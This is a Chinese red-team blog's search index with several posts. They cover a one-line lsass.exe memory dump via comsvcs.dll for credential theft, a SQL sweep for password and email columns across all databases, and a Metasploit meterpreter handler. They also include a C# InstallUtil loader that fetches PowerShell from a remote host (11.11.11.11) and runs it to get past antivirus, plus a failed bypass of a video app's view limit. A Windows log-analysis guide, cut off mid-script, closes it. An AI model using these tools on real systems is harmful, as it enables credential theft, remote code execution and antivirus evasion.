<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>一条命令dump lsass.exe 进程内存</title>
      <link href="/2019/08/30/dump-lsass-exe/"/>
      <url>/2019/08/30/dump-lsass-exe/</url>
      
        <content type="html"><![CDATA[<ul><li>特点: 加载comsvcs.dll系统库，全自动化，不除非杀软</li><li>注意: 请用管理员权限执行</li></ul><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> dumpfile=<span class="variable">%tmp%</span>\<span class="variable">%COMPUTERNAME%</span>_lass.dump&amp; <span class="keyword">for</span> /f  "tokens=<span class="number">2</span>" %i <span class="keyword">in</span> ('tasklist /FI "IMAGENAME eq lsass.exe" /NH') <span class="keyword">do</span> @rundll32 C:\windows\system32\comsvcs.dll, MiniDump %i <span class="variable">%dumpfile%</span> full&amp;<span class="built_in">PING</span> -n <span class="number">3</span> <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> &gt;<span class="built_in">NUL</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> || <span class="built_in">PING</span> -n <span class="number">3</span> ::<span class="number">1</span> &gt;<span class="built_in">NUL</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> &amp;<span class="keyword">IF</span> <span class="keyword">EXIST</span> <span class="variable">%dumpfile%</span> (<span class="built_in">echo</span> processname:lsass.exe Memory saved to <span class="variable">%dumpfile%</span>) <span class="keyword">else</span> (<span class="built_in">echo</span> Dump wrong.)</span><br></pre></td></tr></table></figure><p><a href="https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/" target="_blank" rel="noopener">参考:MiniDumpWriteDump via COM+ Services DLL</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> redteam </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mssql 找指定库指定表</title>
      <link href="/2019/08/29/mssql-Tips/"/>
      <url>/2019/08/29/mssql-Tips/</url>
      
        <content type="html"><![CDATA[<h3 id="找出包含关键字段的库和表"><a href="#找出包含关键字段的库和表" class="headerlink" title="找出包含关键字段的库和表"></a>找出包含关键字段的库和表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> @i <span class="built_in">int</span>,@<span class="keyword">id</span> <span class="built_in">int</span>,@dbname <span class="built_in">varchar</span>(<span class="number">255</span>),@<span class="keyword">sql</span> <span class="built_in">varchar</span>(<span class="number">255</span>)</span><br><span class="line">    <span class="keyword">set</span> @i = <span class="number">6</span></span><br><span class="line">    <span class="keyword">set</span> @<span class="keyword">id</span>=(<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> master..sysdatabases)</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="comment">#t (</span></span><br><span class="line">    dbname <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">    tablename <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">    columnname <span class="built_in">varchar</span>(<span class="number">255</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (@i &lt; @<span class="keyword">id</span>)</span><br><span class="line">    <span class="keyword">begin</span></span><br><span class="line">        <span class="keyword">set</span> @i = @i + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">set</span> @dbname = (<span class="keyword">select</span> <span class="keyword">name</span> <span class="keyword">from</span> master..sysdatabases <span class="keyword">where</span> dbid= @i)</span><br><span class="line">        <span class="keyword">set</span> @<span class="keyword">sql</span> = <span class="string">'use '</span>+ @dbname+<span class="string">';insert [#t] select table_catalog,table_name,column_name from information_schema.columns where column_name like ''%pass%'' or column_name like ''%pwd%'' or column_name like ''%mail%'''</span></span><br><span class="line">        exec (@<span class="keyword">sql</span>)</span><br><span class="line">        print @<span class="keyword">sql</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="comment">#t</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="comment">#t</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span></span><br></pre></td></tr></table></figure><h3 id="所有库中找某个表"><a href="#所有库中找某个表" class="headerlink" title="所有库中找某个表"></a>所有库中找某个表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> @<span class="keyword">SQL</span> <span class="keyword">NVARCHAR</span>(<span class="keyword">max</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">SET</span> @<span class="keyword">SQL</span> = <span class="keyword">stuff</span>((</span><br><span class="line">            <span class="keyword">SELECT</span> <span class="string">'</span></span><br><span class="line"><span class="string">UNION</span></span><br><span class="line"><span class="string">SELECT '</span> + <span class="keyword">quotename</span>(<span class="keyword">NAME</span>, <span class="string">''''</span>) + <span class="string">' as Db_Name, Name collate SQL_Latin1_General_CP1_CI_AS as Table_Name</span></span><br><span class="line"><span class="string">FROM '</span> + <span class="keyword">quotename</span>(<span class="keyword">NAME</span>) + <span class="string">'.sys.tables WHERE NAME LIKE ''%'' + @TableName + ''%'''</span></span><br><span class="line">            <span class="keyword">FROM</span> sys.databases</span><br><span class="line">            <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">NAME</span></span><br><span class="line">            <span class="keyword">FOR</span> <span class="keyword">XML</span> <span class="keyword">PATH</span>(<span class="string">''</span>)</span><br><span class="line">                ,<span class="keyword">type</span></span><br><span class="line">            ).value(<span class="string">'.'</span>, <span class="string">'nvarchar(max)'</span>), <span class="number">1</span>, <span class="number">8</span>, <span class="string">''</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">--PRINT @SQL;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">EXECUTE</span> sp_executeSQL @<span class="keyword">SQL</span></span><br><span class="line">    ,N<span class="string">'@TableName varchar(30)'</span></span><br><span class="line">    ,@TableName = <span class="string">'admin'</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> RedTeam </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c# 远程执行命令</title>
      <link href="/2019/08/27/remote-exec-powershell/"/>
      <url>/2019/08/27/remote-exec-powershell/</url>
      
        <content type="html"><![CDATA[<p>一般直接执行powershell会被大多数杀毒软件拦截，利用<code>c#</code> <strong>Pipeline</strong> 执行远程powershell来绕过杀毒软件</p><p><a href="https://medium.com/tsscyber/pentesting-and-hta-bypassing-powershell-constrained-language-mode-53a42856c997" target="_blank" rel="noopener">参考来源:tsscyber</a></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use multi/script/web_delivery</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_http</span><br><span class="line"><span class="built_in">set</span> target <span class="number">2</span></span><br><span class="line">...</span><br><span class="line">run -j</span><br><span class="line">...</span><br><span class="line"><span class="function">c:\<span class="title">Windows</span>\<span class="title">Microsoft.NET</span>\<span class="title">Framework64</span>\<span class="title">v4</span>.0.30319\<span class="title">csc.exe</span> /<span class="title">r:c</span>:\<span class="title">Windows</span>\<span class="title">assembly</span>\<span class="title">GAC_MSIL</span>\<span class="title">System.Management.Automation</span>\1.0.0.0__31bf3856ad364e35\<span class="title">System.Management.Automation.dll</span> /<span class="title">unsafe</span> /<span class="title">platform:anycpu</span> /<span class="title">out:ps</span>.<span class="title">exe</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">Microsoft.NET</span>\<span class="title">Framework64</span>\<span class="title">v4</span>.0.30319\<span class="title">InstallUtil.exe</span> /<span class="title">logfile</span>= /<span class="title">LogToConsole</span>=<span class="title">True</span> /<span class="title">u</span> .\<span class="title">ps.exe</span></span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Net;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Configuration.Install;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line">using System.Management.Automation.Runspaces;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class Program</span><br><span class="line"> &#123;</span><br><span class="line"> public static void Main()</span><br><span class="line"> &#123;</span><br><span class="line"> //Console.WriteLine(<span class="string">"test"</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> [System.ComponentModel.RunInstaller(true)]</span><br><span class="line"> public class Sample : System.Configuration.Install.Installer</span><br><span class="line"> &#123;</span><br><span class="line"> public override void Uninstall(System.Collections.IDictionary savedState)</span><br><span class="line"> &#123;</span><br><span class="line"> Mycode.Exec();</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> public class Mycode</span><br><span class="line"> &#123;</span><br><span class="line"> public static void Exec()</span><br><span class="line"> &#123;</span><br><span class="line">WebClient client = new WebClient();</span><br><span class="line">//远程执行命令</span><br><span class="line">Stream stream = client.OpenRead(<span class="string">"http://11.11.11.11/powershell.txt"</span>);</span><br><span class="line">StreamReader reader = new StreamReader(stream);</span><br><span class="line">String command = reader.ReadToEnd();</span><br><span class="line">//Console.WriteLine(text);</span><br><span class="line"></span><br><span class="line"> //string command = System.IO.File.ReadAllText(text);</span><br><span class="line"> RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();</span><br><span class="line"> Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);</span><br><span class="line"> rspace.Open();</span><br><span class="line"> Pipeline pipeline = rspace.CreatePipeline();</span><br><span class="line"> pipeline.Commands.AddScript(command);</span><br><span class="line"> pipeline.InvokeAsync();</span><br><span class="line"><span class="keyword">while</span>(pipeline.PipelineStateInfo.State == PipelineState.Running || pipeline.PipelineStateInfo.State == PipelineState.Stopping) &#123;</span><br><span class="line">System.Threading.Thread.Sleep(<span class="number">50</span>);</span><br><span class="line">&#125;</span><br><span class="line">Console.WriteLine(<span class="string">"startasdfasdfasdf"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (object item <span class="keyword">in</span> pipeline.Output.ReadToEnd())</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span>(item != null) &#123;</span><br><span class="line">            Console.WriteLine(item.ToString());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> (object item <span class="keyword">in</span> pipeline.Error.ReadToEnd())</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span>(item != null) &#123;</span><br><span class="line">            Console.WriteLine(item.ToString());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> redteam 红队 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fiddler script功能实战</title>
      <link href="/2019/05/25/fiddler-app/"/>
      <url>/2019/05/25/fiddler-app/</url>
      
        <content type="html"><![CDATA[<blockquote><p>某视频app发现有观影次数限制很是不爽；想通过分析数据包来看看能不能绕过限制</p></blockquote><p>使用fiddler包分析发现返回请求数据包都加密了<br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images/2019-05-25-03-23-26.png" alt></p><h2 id="0x01-加密方式"><a href="#0x01-加密方式" class="headerlink" title="0x01 加密方式"></a>0x01 加密方式</h2><blockquote><p>对每个字符进行异或混淆</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">decodeResponse</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">char</span>[] toCharArray = str.toCharArray();</span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; toCharArray.length; i++) &#123;</span><br><span class="line">           toCharArray[i] = (<span class="keyword">char</span>) (toCharArray[i] ^ <span class="number">20190101</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> String.valueOf(toCharArray);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="0x02-使用Chrome-console调试解密方式"><a href="#0x02-使用Chrome-console调试解密方式" class="headerlink" title="0x02 使用Chrome console调试解密方式"></a>0x02 使用Chrome console调试解密方式</h2><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images/2019-05-25-03-09-14.png" alt></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> testStr=<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> toCharArray=testStr.split(<span class="string">''</span>)</span><br><span class="line">en=<span class="string">''</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; toCharArray.length; i++)&#123;</span><br><span class="line">en += <span class="built_in">String</span>.fromCharCode(toCharArray[i].charCodeAt(<span class="number">0</span>).toString(<span class="number">10</span>) ^ <span class="number">20190101</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-使用fiddler-script进行自动解密"><a href="#0x03-使用fiddler-script进行自动解密" class="headerlink" title="0x03 使用fiddler script进行自动解密"></a>0x03 使用fiddler script进行自动解密</h2><blockquote><p>fiddler 使用的是<code>jscript.net</code> 语言作为脚本，使用fiddler脚本实现了自动解加密包以便后面分析</p></blockquote><p><strong>解密后的效果</strong><br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images/2019-05-25-03-17-29.png" alt></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">OnBeforeResponse</span>(<span class="params">oSession: Session</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (oSession.HostnameIs(<span class="string">"api88.awk2.work"</span>) ||oSession.HostnameIs(<span class="string">"api99.chinanb.work"</span>) ) &#123;</span><br><span class="line">        oSession[<span class="string">"ui-color"</span>] = <span class="string">"white"</span>;</span><br><span class="line">        oSession[<span class="string">"ui-backcolor"</span>] = <span class="string">"green"</span>;</span><br><span class="line">        oSession.utilDecodeResponse();</span><br><span class="line">        <span class="keyword">var</span> oBody = System.Text.Encoding.UTF8.GetString(oSession.responseBodyBytes);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> en=<span class="string">''</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i:int = <span class="number">0</span>;i&lt;=oBody.length;i++)&#123;</span><br><span class="line">            en+=<span class="built_in">String</span>.fromCharCode(oBody.charCodeAt(i) ^ <span class="number">20190101</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        oSession.utilSetResponseBody(en);  </span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-解除观看限制"><a href="#0x04-解除观看限制" class="headerlink" title="0x04 解除观看限制"></a>0x04 解除观看限制</h2><blockquote><p>以下返回数据包记录以及控制观影次数<br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images/2019-05-25-03-32-14.png" alt></p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"code"</span>:<span class="number">0</span>,<span class="attr">"data"</span>:[&#123;<span class="attr">"readLevel"</span>:<span class="number">0</span>,<span class="attr">"preferenceCustom"</span>:<span class="string">""</span>,<span class="attr">"gender"</span>:<span class="number">-1</span>,<span class="attr">"supUserId"</span>:<span class="number">5483824</span>,<span class="attr">"todayDownNum"</span>:<span class="number">0</span>,<span class="attr">"companion"</span>:<span class="string">""</span>,<span class="attr">"userBrowCnt"</span>:<span class="number">39</span>,<span class="attr">"tagIds"</span>:<span class="string">""</span>,<span class="attr">"icon"</span>:<span class="string">""</span>,<span class="attr">"title"</span>:<span class="string">""</span>,<span class="attr">"dailyViewNum"</span>:<span class="number">10</span>,<span class="attr">"myInviteCode"</span>:<span class="string">"XUPBUL"</span>,<span class="attr">"userCode"</span>:<span class="literal">null</span>,<span class="attr">"tagNames"</span>:<span class="string">""</span>,<span class="attr">"inviteCnt"</span>:<span class="number">0</span>,<span class="attr">"nextLevelNeed"</span>:<span class="number">1</span>,<span class="attr">"leftViewNum"</span>:<span class="number">9</span>,<span class="attr">"vipExpiredDate"</span>:<span class="string">""</span>,<span class="attr">"aliasName"</span>:<span class="literal">null</span>,<span class="attr">"userCls"</span>:<span class="number">2</span>,<span class="attr">"level"</span>:<span class="number">0</span>,<span class="attr">"limitDownNum"</span>:<span class="number">0</span>,<span class="attr">"exceedPercent"</span>:<span class="number">0</span>,<span class="attr">"birth"</span>:<span class="string">""</span>,<span class="attr">"gmtCreate"</span>:<span class="string">"2019-01-01 23:04:27.000"</span>,<span class="attr">"userId"</span>:<span class="number">9216760</span>,<span class="attr">"isMaxLevel"</span>:<span class="number">0</span>,<span class="attr">"oldDriver"</span>:<span class="number">0</span>,<span class="attr">"phone"</span>:<span class="string">"15****35"</span>,<span class="attr">"name"</span>:<span class="literal">null</span>,<span class="attr">"job"</span>:<span class="string">""</span>&#125;],<span class="attr">"enumCode"</span>:<span class="string">"SUCCESS"</span>,<span class="attr">"msg"</span>:<span class="string">"1"</span>,<span class="attr">"success"</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure><p>使用fiddler脚本功能捕获关键字插入正常观影次数的数据包</p><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images/2019-05-25-03-37-23.png" alt></p><blockquote><p>手机端发现观看次数变成9次了:)</p></blockquote><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images/2019-05-25-03-42-42.png" alt></p><p>实际上只是表面显示上是突破了，服务端有作统计校验，<strong>本次破解以失败告终。</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> app测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows 日志分析</title>
      <link href="/2019/04/07/EventLog/"/>
      <url>/2019/04/07/EventLog/</url>
      
        <content type="html"><![CDATA[<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="常用事件-ID-含义"><a href="#常用事件-ID-含义" class="headerlink" title="常用事件 ID 含义"></a>常用事件 ID 含义</h3><table><thead><tr><th>Event ID(2000/XP/2003)</th><th>Event ID(Vista/7/8/2008/2012)</th><th>描述</th><th>日志名称</th></tr></thead><tbody><tr><td>528</td><td>4624</td><td>成功登录</td><td>Security</td></tr><tr><td>529</td><td>4625</td><td>失败登录</td><td>Security</td></tr><tr><td>680</td><td>4776</td><td>成功/失败的账户认证</td><td>Security</td></tr><tr><td>624</td><td>4720</td><td>创建用户</td><td>Security</td></tr><tr><td>636</td><td>4732</td><td>添加用户到启用安全性的本地组中</td><td>Security</td></tr><tr><td>632</td><td>4728</td><td>添加用户到启用安全性的全局组中</td><td>Security</td></tr><tr><td>2934</td><td>7030</td><td>服务创建错误</td><td>System</td></tr><tr><td>2944</td><td>7040</td><td>IPSEC服务服务的启动类型已从禁用更改为自动启动</td><td>System</td></tr><tr><td>2949</td><td>7045</td><td>服务创建</td><td>System</td></tr><tr><td>556</td><td>4662</td><td>DC hash传递攻击</td><td>Security</td></tr></tbody></table><h3 id="登陆类型"><a href="#登陆类型" class="headerlink" title="登陆类型"></a>登陆类型</h3><table><thead><tr><th>登录类型</th><th>登录类型</th><th>描述</th></tr></thead><tbody><tr><td>2</td><td>Interactive</td><td>用户登录到本机</td></tr><tr><td>3</td><td>Network</td><td>用户或计算手机从网络登录到本机，如果网络共享，或使用 net use 访问网络共享，net view 查看网络共享</td></tr><tr><td>4</td><td>Batch</td><td>批处理登录类型，无需用户干预</td></tr><tr><td>5</td><td>Service</td><td>服务控制管理器登录</td></tr><tr><td>7</td><td>Unlock</td><td>用户解锁主机</td></tr><tr><td>8</td><td>NetworkCleartext</td><td>用户从网络登录到此计算机，用户密码用非哈希的形式传递</td></tr><tr><td>9</td><td>NewCredentials</td><td>进程或线程克隆了其当前令牌，但为出站连接指定了新凭据</td></tr><tr><td>10</td><td>Remotelnteractive</td><td>使用终端服务或远程桌面连接登录</td></tr><tr><td>11</td><td>Cachedlnteractive</td><td>用户使用本地存储在计算机上的凭据登录到计算机（域控制器可能无法验证凭据），如主机不能连接域控，以前使用域账户登录过这台主机，再登录就会产生这样日志</td></tr><tr><td>12</td><td>CachedRemotelnteractive</td><td>与 Remotelnteractive 相同，内部用于审计目的</td></tr><tr><td>13</td><td>CachedUnlock</td><td>登录尝试解锁</td></tr></tbody></table><h2 id="Log-Parser-常用命令"><a href="#Log-Parser-常用命令" class="headerlink" title="Log Parser 常用命令"></a>Log Parser 常用命令</h2><p>失败记录(爆破行为)</p><p><strong>直接查看</strong></p><p><code>LogParser.exe  -stats:OFF -i:EVT  &quot;SELECT top 1000 TimeGenerated AS Date,  EXTRACT_TOKEN(strings,10,&#39;|&#39;) as Logtype,EXTRACT_TOKEN(strings,19,&#39;|&#39;) as SourceIP,EXTRACT_TOKEN(strings,13,&#39;|&#39;) as ComputerName,EXTRACT_TOKEN(strings,5,&#39;|&#39;) as User  from &#39;Security.evtx&#39; where EventID=4625&quot; -o:DATAGRID</code></p><p><strong>导出csv</strong></p><blockquote><p>方便后期excel 分析</p></blockquote><p><code>LogParser.exe  -stats:OFF -i:EVT  &quot;SELECT  TimeGenerated AS Date,  EXTRACT_TOKEN(strings,10,&#39;|&#39;) as Logtype,EXTRACT_TOKEN(strings,19,&#39;|&#39;) as SourceIP,EXTRACT_TOKEN(strings,5,&#39;|&#39;) as User into tmp_result.csv from &#39;Security.evtx&#39; where EventID=4625&quot; -o:csv</code></p><p><strong>成功登陆(4624)</strong></p><blockquote><p><code>not like &#39;%$&#39;</code> 一般用于查询非机器登陆域控账号</p></blockquote><p><code>LogParser.exe  -stats:OFF -i:EVT  &quot;SELECT  top 1000 TimeGenerated AS Date,EXTRACT_TOKEN(strings,8,&#39;|&#39;) as Logtype,EXTRACT_TOKEN(strings,18,&#39;|&#39;) as SourceIP,EXTRACT_TOKEN(strings,5,&#39;|&#39;) as User from  &#39;Security.evtx&#39; where EventID=4624 And User not like &#39;%$&#39;&quot; -o:DATAGRID</code></p><p><strong>hash传递(4662)</strong><br><code>LogParser.exe -i:EVT &quot;select distinct TimeGenerated,EXTRACT_TOKEN(Strings,2,&#39;|&#39;) AS Domain,EXTRACT_TOKEN(Strings,1,&#39;|&#39;) AS UserName,ComputerName from Security where EventID=4662 order by TimeGenerated desc&quot; -o:DATAGRID</code></p><h2 id="使用powershell-将外部日志导成csv"><a href="#使用powershell-将外部日志导成csv" class="headerlink" title="使用powershell 将外部日志导成csv"></a>使用powershell 将外部日志导成csv</h2><p><strong>evtx</strong> 导出<strong>csv</strong> 主要目的方便后面<strong>excel</strong> 分析、筛选。前面用多种方法导出csv发现速度慢得要命，<strong>LogParser.exe</strong>命令又太长， 后面版本将参数化、并加入多种日志一键导出</p><blockquote><p>使用Get-WinEvent 方法导出日志特点是非常非常非常慢，对于日志量小还可以接受。优点是完全使用powershell不依赖第三方，且可以导入外部日志 Get-EventLog 就要快很多，但是不支持导入外部日志，单纯分析当前机器日志可以使用Get-EventLog来实现</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$hostname</span>=(hostname)</span><br><span class="line"><span class="variable">$LogonType</span> = @&#123;</span><br><span class="line">    [uint32]<span class="number">2</span> = <span class="string">'Interactive'</span></span><br><span class="line">    [uint32]<span class="number">3</span> = <span class="string">'ipc 登陆'</span></span><br><span class="line">    [uint32]<span class="number">4</span> = <span class="string">'Batch'</span></span><br><span class="line">    [uint32]<span class="number">5</span> = <span class="string">'Service'</span></span><br><span class="line">    [uint32]<span class="number">7</span> = <span class="string">'Unlock'</span></span><br><span class="line">    [uint32]<span class="number">8</span> = <span class="string">'NetworkCleartext'</span></span><br><span class="line">    [uint32]<span class="number">9</span> = <span class="string">'NewCredentials'</span></span><br><span class="line">    [uint32]<span class="number">10</span> = <span class="string">'远程桌面登陆'</span></span><br><span class="line">    [uint32]<span class="number">11</span> = <span class="string">'CachedInteractive'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$events_fail</span> =<span class="built_in">Get-WinEvent</span> -FilterHashTable @&#123; ID=<span class="number">4625</span>;ProviderName=<span class="string">'Microsoft-Windows-Security-Auditing'</span>;LogName=<span class="string">"Security"</span>;Path=<span class="string">"日志路径\_Security.evtx"</span>;&#125;</span><br><span class="line"><span class="variable">$events_success</span> =<span class="built_in">Get-WinEvent</span> -FilterHashTable @&#123; ID=<span class="number">4624</span>;ProviderName=<span class="string">'Microsoft-Windows-Security-Auditing'</span>;LogName=<span class="string">"Security"</span>;Path=<span class="string">"日志路径\_Security.evtx"</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$events_fail</span>|<span class="built_in">ForEach-Object</span> &#123; <span class="built_in">New-Object</span> PSObject -Property ([ordered]@&#123;</span><br><span class="line">            MachineName = (<span class="variable">$_</span>.MachineName).Split(<span class="string">'.'</span>)[<span class="number">0</span>]</span><br><span class="line">            TimeCreated = <span class="variable">$_</span>.TimeCreated</span><br><span class="line">            User = <span class="variable">$_</span>.Properties[<span class="number">5</span>].Value</span><br><span class="line">            Domain = <span class="variable">$_</span>.Properties[<span class="number">6</span>].Value</span><br><span class="line">            LogonType = <span class="variable">$_</span>.Properties[<span class="number">10</span>].Value</span><br><span class="line">            LogonTypeString = <span 